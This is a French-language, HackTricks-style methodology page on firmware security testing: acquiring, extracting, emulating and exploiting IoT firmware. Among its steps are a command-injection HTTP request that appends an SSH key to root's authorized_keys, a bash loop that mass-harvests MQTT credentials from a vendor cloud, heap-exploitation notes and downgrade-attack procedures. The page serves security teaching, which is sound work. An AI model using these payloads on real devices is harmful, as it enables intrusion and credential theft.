# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels avec lesquels les utilisateurs interagissent. Il est stocké dans une mémoire permanente, garantissant que l'appareil peut accéder à des instructions vitales dès sa mise sous tension, ce qui conduit au lancement du système d'exploitation. L'examen et la modification potentielle du firmware sont une étape critique pour identifier les vulnérabilités de sécurité.

## **Gathering Information**

**Gathering information** est une étape initiale critique pour comprendre la composition d'un appareil et les technologies qu'il utilise. Ce processus consiste à collecter des données sur :

- L'architecture CPU et le système d'exploitation qu'il exécute
- Les spécificités du bootloader
- La disposition matérielle et les datasheets
- Les métriques de la base de code et les emplacements du source
- Les bibliothèques externes et les types de licence
- L'historique des mises à jour et les certifications réglementaires
- Les diagrammes architecturaux et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d'**open-source intelligence (OSINT)** sont inestimables, tout comme l'analyse de tout composant open-source disponible à l'aide de processus d'examen manuels et automatisés. Des outils comme [Coverity Scan](https://scan.coverity.com) et [Semmle’s LGTM](https://lgtm.com/#explore) offrent une analyse statique gratuite qui peut être exploitée pour détecter des problèmes potentiels.

## **Acquiring the Firmware**

L'obtention du firmware peut être abordée par différents moyens, chacun avec son propre niveau de complexité :

- **Directement** depuis la source (développeurs, fabricants)
- Le **construire** à partir d'instructions fournies
- Le **télécharger** depuis les sites officiels de support
- Utiliser des requêtes **Google dork** pour trouver des fichiers firmware hébergés
- Accéder directement au **cloud storage**, avec des outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **updates** via des techniques man-in-the-middle
- **Extraire** depuis l'appareil via des connexions comme **UART**, **JTAG**, ou **PICit**
- **Sniffing** des requêtes de mise à jour dans la communication de l'appareil
- Identifier et utiliser des **hardcoded update endpoints**
- **Dumping** depuis le bootloader ou le réseau
- **Retirer et lire** la puce de stockage, quand tout le reste échoue, à l'aide des outils matériels appropriés

### UART-only logs: force a root shell via U-Boot env in flash

Si UART RX est ignoré (logs only), vous pouvez quand même forcer un init shell en **modifiant le blob d'environnement U-Boot** hors ligne :

1. Dump SPI flash avec une pince SOIC-8 + programmateur (3.3V) :
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localisez la partition U-Boot env, modifiez `bootargs` pour inclure `init=/bin/sh`, et **recalculez le CRC32 de l'environnement U-Boot** pour le blob.
3. Reflash seulement la partition env et redémarrez ; un shell devrait apparaître sur UART.

C'est utile sur les appareils embarqués où le shell du bootloader est désactivé mais la partition env est inscriptible via un accès externe au flash.

## Analyzing the firmware

Maintenant que vous **avez le firmware**, vous devez en extraire des informations pour savoir comment le traiter. Différents outils que vous pouvez utiliser pour cela :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropy** de l’image avec `binwalk -E <bin>`, si elle est faible, alors il est peu probable qu’elle soit chiffrée. Si elle est élevée, elle est probablement chiffrée (ou compressée d’une certaine manière).

De plus, vous pouvez utiliser ces outils pour extraire des **files embedded inside the firmware** :


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le file.

### Getting the Filesystem

Avec les outils commentés précédemment comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le filesystem**.\
Binwalk l’extrait généralement dans un **folder nommé d’après le type de filesystem**, qui est généralement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Parfois, binwalk **n’aura pas le magic byte du filesystem dans ses signatures**. Dans ces cas, utilisez binwalk pour **trouver l’offset du filesystem et extraire le compressed filesystem** depuis le binary, puis **extraire manuellement** le filesystem selon son type en suivant les étapes ci-dessous.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Exécutez la commande **dd** suivante pour extraire le système de fichiers Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l'exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers seront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d'archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les fichiersystems jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les fichiersystems ubifs avec NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus implique l'utilisation de divers outils pour analyser et extraire des données précieuses de l'image du firmware.

### Initial Analysis Tools

Un ensemble de commandes est fourni pour l'inspection initiale du fichier binaire (appelé `<bin>`). Ces commandes aident à identifier les types de fichiers, extraire des chaînes, analyser les données binaires, et comprendre les détails de la partition et du filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Pour évaluer l’état de chiffrement de l’image, l’**entropy** est vérifiée avec `binwalk -E <bin>`. Une faible entropy suggère une absence de chiffrement, tandis qu’une forte entropy indique un possible chiffrement ou une compression.

Pour extraire les **embedded files**, des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour l’inspection des fichiers sont recommandés.

### Extraire le Filesystem

En utilisant `binwalk -ev <bin>`, on peut généralement extraire le filesystem, souvent dans un répertoire nommé d’après le type de filesystem (par ex., squashfs, ubifs). Cependant, lorsque **binwalk** ne parvient pas à reconnaître le type de filesystem en raison de l’absence de magic bytes, une extraction manuelle est nécessaire. Cela implique d’utiliser `binwalk` pour localiser l’offset du filesystem, puis la commande `dd` pour extraire le filesystem :
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Après cela, selon le type de filesystem (par ex. squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du filesystem

Une fois le filesystem extrait, la recherche de failles de sécurité commence. L’attention se porte sur les network daemons non sécurisés, les credentials codés en dur, les API endpoints, les fonctionnalités de update server, le code non compilé, les startup scripts et les binaries compilés pour une analyse hors ligne.

**Les emplacements clés** et **éléments** à inspecter incluent :

- **etc/shadow** et **etc/passwd** pour les user credentials
- Les certificats SSL et les clés dans **etc/ssl**
- Les fichiers de configuration et de script pour d’éventuelles vulnérabilités
- Les binaries embarqués pour une analyse plus poussée
- Les web servers et binaries courants des appareils IoT

Plusieurs tools aident à découvrir des informations sensibles et des vulnérabilités dans le filesystem :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour la recherche d’informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Security Checks sur les Compiled Binaries

Le code source comme les compiled binaries trouvés dans le filesystem doivent être examinés pour détecter des vulnérabilités. Des tools comme **checksec.sh** pour les binaries Unix et **PESecurity** pour les binaries Windows aident à identifier les binaries non protégés qui pourraient être exploités.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Many IoT hubs fetch their per-device configuration from a cloud endpoint that looks like :

- `https://<api-host>/pf/<deviceId>/<token>`

During firmware analysis you may find that `<token>` is derived locally from the device ID using a hardcoded secret, for example :

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

This design enables anyone who learns a deviceId and the STATIC_KEY to reconstruct the URL and pull cloud config, often revealing plaintext MQTT credentials and topic prefixes.

Practical workflow :

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs :
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Recherchez les lignes imprimant le modèle d'URL de configuration cloud et l'adresse du broker, par exemple :
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Récupérer STATIC_KEY et l’algorithme du token depuis le firmware

- Chargez les binaires dans Ghidra/radare2 et recherchez le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmez l’algorithme (par ex. MD5(deviceId||STATIC_KEY)).
- Dérivez le token en Bash et mettez le digest en majuscules :
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Récolter la configuration cloud et les identifiants MQTT

- Composez l'URL et récupérez le JSON avec curl ; analysez-le avec jq pour extraire les secrets :
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuser MQTT en clair et les ACL de topic faibles (si présents)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et recherchez des événements sensibles :
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Énumérer des device IDs prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets vendor OUI/product/type suivis d’un suffixe séquentiel.
- Vous pouvez itérer des IDs candidats, dériver des tokens et récupérer des configs programmatically :
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Obtenez toujours une autorisation explicite avant d'entreprendre une énumération massive.
- Préférez l'émulation ou l'analyse statique pour récupérer des secrets sans modifier le hardware cible lorsque c'est possible.


Le processus d'émulation du firmware permet une **dynamic analysis** soit du fonctionnement d'un device, soit d'un programme individuel. Cette approche peut rencontrer des difficultés liées au hardware ou aux dépendances d'architecture, mais transférer le root filesystem ou des binaries spécifiques vers un device ayant une architecture et une endianness correspondantes, comme un Raspberry Pi, ou vers une machine virtuelle préconstruite, peut faciliter des tests supplémentaires.

### Émulation de binaries individuels

Pour examiner des programmes uniques, il est crucial d'identifier l'endianness et l'architecture CPU du programme.

#### Exemple avec l'architecture MIPS

Pour émuler un binary d'architecture MIPS, on peut utiliser la commande:
```bash
file ./squashfs-root/bin/busybox
```
Et pour installer les outils d'émulation nécessaires :
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Pour MIPS (big-endian), `qemu-mips` est utilisé, et pour les binaires little-endian, `qemu-mipsel` serait le choix.

#### ARM Architecture Emulation

Pour les binaires ARM, le processus est similaire, avec l’émulateur `qemu-arm` utilisé pour l’émulation.

### Full System Emulation

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), et d’autres, facilitent l’émulation complète du firmware, en automatisant le processus et en aidant à l’analyse dynamique.

## Dynamic Analysis in Practice

À ce stade, un environnement de device réel ou émulé est utilisé pour l’analyse. Il est essentiel de conserver un accès shell à l’OS et au filesystem. L’émulation peut ne pas reproduire parfaitement les interactions hardware, nécessitant parfois des redémarrages de l’émulation. L’analyse doit revisiter le filesystem, exploiter les webpages exposées et les services réseau, et explorer les vulnérabilités du bootloader. Les tests d’intégrité du firmware sont essentiels pour identifier d’éventuelles vulnérabilités de backdoor.

## Runtime Analysis Techniques

L’analyse runtime consiste à interagir avec un process ou un binaire dans son environnement d’exécution, en utilisant des outils comme gdb-multiarch, Frida, et Ghidra pour définir des breakpoints et identifier des vulnérabilités via le fuzzing et d’autres techniques.

Pour les targets embedded sans debugger complet, **copiez un `gdbserver` lié statiquement** sur le device et attachez-vous à distance :
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Sur les hubs IoT, la pile RF est souvent séparée entre un **radio MCU** et un processus userland Linux. Un workflow utile consiste à mapper le chemin :

1. **RF frame** sur l’air
2. **controller-side parser** sur le radio MCU
3. **serial/UART text or TLV protocol** relayé vers Linux (par exemple `/dev/tty*`)
4. **application dispatcher** dans le daemon principal
5. **protocol-specific handler / state machine**

Cette architecture crée deux cibles de reverse engineering au lieu d’une. Si le controller convertit des trames radio binaires en un protocole textuel tel que `Group,Command,arg1,arg2,...`, récupérez :

- Les **message groups** et les tables de dispatch
- Quels messages peuvent venir du **network** versus du controller lui-même
- Les champs discriminateurs **manufacturer-specific** exacts (par exemple Zigbee `manufacturer_code` et `cluster_command` custom)
- Quels handlers ne sont atteignables que pendant les phases de **commissioning**, discovery, ou firmware/model download

Pour Zigbee spécifiquement, capturez le trafic de pairing et vérifiez si la cible dépend toujours de la **Link Key** par défaut `ZigBeeAlliance09`. Si oui, le sniffing du trafic de commissioning peut exposer la **Network Key**. Les install codes Zigbee 3.0 réduisent cette exposition, donc notez si l’appareil testé les impose réellement.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Les commandes Zigbee/ZCL spécifiques au vendor sont souvent une meilleure cible que les clusters standardisés, car elles alimentent du **custom parsing code** et des **FSMs** internes avec une validation moins éprouvée.

Workflow pratique :

- Reverse le command dispatcher jusqu’à trouver le **vendor-only handler**.
- Récupérez les tables **FSM state**, **event**, **check**, **action**, et **next-state**.
- Identifiez les **transitional states** qui avancent automatiquement, ainsi que les branches retry/error qui finissent par reset ou free l’état contrôlé par l’attaquant.
- Confirmez quelles échanges de protocole légitimes sont nécessaires pour placer le daemon dans l’état vulnérable, au lieu de supposer que le handler buggué est toujours atteignable.

Pour les protocoles sensibles au timing, le replay de paquets depuis un framework Python peut être trop lent. Une approche plus fiable consiste à émuler un appareil légitime sur du vrai matériel (par exemple un **nRF52840**) avec une pile de niveau vendor, afin d’exposer les bons **endpoints**, **attributes**, et le bon timing de commissioning.

### Fragmented-download bug class in embedded daemons

Une classe récurrente de bugs firmware apparaît dans les **fragmented blob/model/configuration downloads** :

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **packet-local** contrôlés par l’attaquant, comme `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier la **taille allouée originale**.

Cela permet à un attaquant d’envoyer :

- Un premier fragment valide avec une **petite** taille totale déclarée pour forcer une petite allocation heap.
- Un fragment ultérieur avec l’**offset** attendu mais un `chunk_len` plus grand.
- Une taille packet-local forgée qui satisfait les nouveaux checks tout en overflowant encore le buffer alloué à l’origine.

Quand le chemin vulnérable est derrière la logique de commissioning, l’exploitation doit inclure suffisamment de **device emulation** pour amener la cible dans l’état attendu de model-download ou blob-download avant d’envoyer les fragments malformés.

### Protocol-driven `free()` triggers

Dans les daemons embarqués, le moyen le plus simple de déclencher une exploitation des métadonnées heap n’est souvent pas “attendre le cleanup” mais **forcer la propre gestion d’erreur du protocole** :

- Envoyez des fragments de suivi malformés pour pousser la FSM dans des états **retry** ou **error**.
- Dépassez le seuil de retry pour que le daemon **reset context** et libère le buffer corrompu.
- Utilisez ce `free()` prévisible pour déclencher des primitives côté allocator avant que le process ne crash pour des raisons sans rapport.

C’est particulièrement utile contre les allocators **musl/uClibc/dlmalloc-like** sur Linux embarqué, où la corruption des métadonnées de chunk peut transformer la logique unlink/unbin en primitive d’écriture. Un pattern stable consiste à corrompre un **size field** pour rediriger le parcours de l’allocator vers des **fake chunks staged inside the overflowed buffer**, au lieu d’écraser immédiatement les vrais pointeurs de bin et de faire crasher le process.

## Binary Exploitation and Proof-of-Concept

Développer un PoC pour des vulnérabilités identifiées demande une compréhension approfondie de l’architecture cible et de la programmation dans des langages de plus bas niveau. Les protections de runtime binary dans les systèmes embarqués sont rares, mais lorsqu’elles existent, des techniques comme Return Oriented Programming (ROP) peuvent être nécessaires.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc utilise des fastbins similaires à glibc. Une future allocation large peut déclencher `__malloc_consolidate()`, donc tout fake chunk doit survivre aux checks (taille cohérente, `fd = 0`, et chunks voisins vus comme "in use").
- **Non-PIE binaries under ASLR:** si ASLR est activé mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire sont stables. Vous pouvez cibler une région qui ressemble déjà à un en-tête de chunk heap valide pour faire tomber une allocation fastbin sur une **function pointer table**.
- **Parser-stopping NUL:** quand JSON est parsé, un `\x00` dans le payload peut arrêter l’analyse tout en conservant les octets traînants contrôlés par l’attaquant pour un stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** une ROP chain qui appelle `open("/proc/self/mem")`, `lseek()`, et `write()` peut placer du shellcode exécutable dans un mapping connu et y sauter.

## Prepared Operating Systems for Firmware Analysis

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour le firmware security testing, avec les outils nécessaires.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS est une distro destinée à vous aider à réaliser des security assessment et du penetration testing sur des Internet of Things (IoT) devices. Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires chargés.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): système d’exploitation de embedded security testing basé sur Ubuntu 18.04, préchargé avec des outils de firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Même lorsqu’un vendor implémente des vérifications de signature cryptographique pour les firmware images, la **version rollback (downgrade) protection** est fréquemment omise. Quand le boot- ou recovery-loader vérifie seulement la signature avec une clé publique embarquée mais ne compare pas la *version* (ou un compteur monotone) de l’image en cours de flash, un attaquant peut légitimement installer un **ancien firmware vulnérable qui porte toujours une signature valide** et ainsi réintroduire des vulnérabilités patchées.

Workflow d’attaque typique :

1. **Obtenir une ancienne image signée**
* La récupérer depuis le portail de téléchargement public du vendor, un CDN ou un site de support.
* L’extraire depuis des applications mobiles/desktop compagnons (par ex. dans un Android APK sous `assets/firmware/`).
* La récupérer depuis des dépôts tiers comme VirusTotal, Internet archives, forums, etc.
2. **Uploader ou servir l’image à l’appareil** via n’importe quel canal de mise à jour exposé :
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *unauthenticated* qui acceptent des firmware blobs encodés en Base64, les décodent côté serveur et déclenchent recovery/upgrade.
3. Après le downgrade, exploitez une vulnérabilité qui a été corrigée dans la version plus récente (par exemple un filtre de command-injection ajouté plus tard).
4. En option, reflashez la dernière image ou désactivez les updates pour éviter la détection une fois la persistence obtenue.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Dans le firmware vulnérable (downgradé), le paramètre `md5` est concaténé directement dans une commande shell sans sanitisation, ce qui permet l'injection de commandes arbitraires (ici – activation d'un accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtrage basique des caractères, mais l'absence de protection contre le downgrade rend la correction inutile.

### Extracting Firmware From Mobile Apps

De nombreux vendors intègrent des images complètes de firmware dans leurs applications mobiles compagnon afin que l'app puisse mettre à jour l'appareil via Bluetooth/Wi-Fi. Ces packages sont généralement stockés non chiffrés dans l'APK/APEX sous des chemins comme `assets/fw/` ou `res/raw/`. Des outils tels que `apktool`, `ghidra`, ou même un simple `unzip` permettent d'extraire des images signées sans toucher au matériel physique.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback uniquement côté updater dans les designs A/B slot

Certains vendors implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de *updater* (par exemple une routine UDS sur CAN, une commande recovery, ou un agent OTA en userspace). Si le **bootloader** ne vérifie ensuite que la signature/CRC de l'image et fait confiance à la partition table ou aux métadonnées du slot, la protection rollback peut quand même être contournée.

Design faible typique :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **security ratchet** / compteur monotone.
- L'updater compare le ratchet de l'image à une valeur stockée en persistent storage et rejette les anciennes images signées.
- Le bootloader ne parse pas ce ratchet et ne vérifie que l'en-tête, le CRC et la signature avant de booter le slot sélectionné.
- L'activation du slot est stockée séparément dans une partition table ou un compteur de génération par slot et n'est **pas cryptographiquement liée** au digest exact du firmware validé.

Cela crée un primitive **validate-one-image / boot-another-image** dans les systèmes à double slot. Si l'attaquant peut faire marquer le slot B comme prochaine cible de boot par l'updater avec une image signée actuelle, puis peut plus tard écraser le slot B avant le reboot, le bootloader peut quand même booter l'image downgradée car il ne fait confiance qu'aux métadonnées du slot déjà commit.

Schéma d'abus courant :

1. Uploader un firmware **current signed** dans le slot passif et lancer la routine normale de validation/switch pour que le layout marque ce slot comme prochain actif.
2. **Ne pas reboot** encore. Ré-entrer dans la routine de préparation/erase du slot dans la même session.
3. Abuser d'un boot-state stale ou d'une logique de slot-selection stale pour que l'updater erase le **même slot physique** qui vient d'être promu.
4. Écrire un firmware **plus ancien mais toujours signé** dans ce slot.
5. Sauter la routine de validation qui impose le ratchet et reboot directement.
6. Le bootloader sélectionne le slot promu, vérifie seulement signature/intégrité, et boote l'ancienne image.

Points à rechercher lors du reverse d'implémentations de mise à jour A/B :

- Sélection du slot dérivée de **boot-time flags** qui ne sont pas rafraîchis après un switch réussi.
- Routine de type `prepare_passive_slot()` qui erase un slot à partir d'un état stale au lieu du **current committed layout**.
- Fonction de type `part_write_layout()` qui ne fait qu'incrémenter un **generation counter** / flag actif et ne stocke pas le hash de l'image validée.
- Vérifications de ratchet implémentées en userspace ou dans le code updater, mais **pas** dans les étapes ROM / bootloader / secure boot.
- Routines d'erase ou recovery qui laissent le slot marqué bootable même après que son contenu a été supprimé et réécrit.

### Checklist pour évaluer la logique de mise à jour

* Le transport/l'authentification du *update endpoint* est-il correctement protégé (TLS + authentication) ?
* Le device compare-t-il des **version numbers** ou un **monotonic anti-rollback counter** avant le flashing ?
* L'image est-elle vérifiée dans une secure boot chain (par exemple signatures vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l'updater, au lieu de seulement vérifier la signature/CRC ?
* Les métadonnées d'activation du slot sont-elles **liées au digest/version du firmware validé**, ou un slot peut-il être modifié après promotion ?
* Après un switch de slot réussi, le device est-il forcé de reboot ou les routines de update/erase restent-elles accessibles dans la même session ?
* Le code userland effectue-t-il des contrôles supplémentaires de cohérence (par ex. partition map autorisée, model number) ?
* Les flows de mise à jour *partial* ou *backup* réutilisent-ils la même logique de validation ?

> 💡  Si l'un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux rollback attacks.

## Vulnerable firmware à pratiquer

Pour pratiquer la découverte de vulnérabilités dans le firmware, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
